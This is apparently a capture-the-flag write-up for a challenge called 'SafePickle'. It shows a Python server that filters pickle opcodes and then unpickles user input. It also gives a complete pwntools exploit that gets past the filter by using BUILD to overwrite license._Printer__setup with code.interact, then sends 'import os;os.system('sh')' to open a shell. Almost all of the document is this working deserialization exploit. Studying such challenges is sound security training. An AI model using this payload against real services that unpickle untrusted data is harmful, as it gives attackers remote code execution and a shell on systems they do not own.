# SafePickle

Attachment:

```python
import pickle, pickletools

BANNED_OPS = [
    "EXT1",
    "EXT2",
    "EXT4",
    "REDUCE",
    "INST",
    "OBJ",
    "PERSID",
    "BINPERSID",
]

data = bytes.fromhex(input("input pickle (hex)> "))
try:
    for opcode, arg, pos in pickletools.genops(data):
        if opcode.name in BANNED_OPS:
            print(f"Banned opcode used: {opcode.name}")
            exit(0)
except Exception as e:
    print("Error :(")
    exit(0)

print(pickle.loads(data))
```

Requirements:

1. Pickle without `EXT1/EXT2/EXT4/REDUCE/INST/OBJ/PERSID/BINPERSID`: use `BUILD` for `license._Printer__setup = code.interact` and `print(license)` to run `code.interact`

Attack script:

```python
from pwn import *
from pickle import *
import pickletools

context(log_level="debug")


payload = (
    # memo 1 = license
    (GLOBAL + b"builtins\nlicense\n" + PUT + b"1\n")
    # memo 2 = code.interact
    + (GLOBAL + b"code\ninteract\n" + PUT + b"2\n")
    # license._Printer__setup = code.interact
    + (
        GET
        + b"1\n"
        + NONE
        + MARK
        + UNICODE
        + b"_Printer__setup\n"
        + GET
        + b"2\n"
        + DICT
        + TUPLE2
        + BUILD
        + POP
    )
    # return license
    + GET + b"1\n"
    + STOP
)

if args.HOST:
    p = remote(args.HOST, args.PORT)
else:
    p = process(["python3", "server.py"])

p.sendline(payload.hex().encode())
p.recvuntil(b">>>")
p.sendline(b"import os;os.system('sh')")
p.interactive()
```
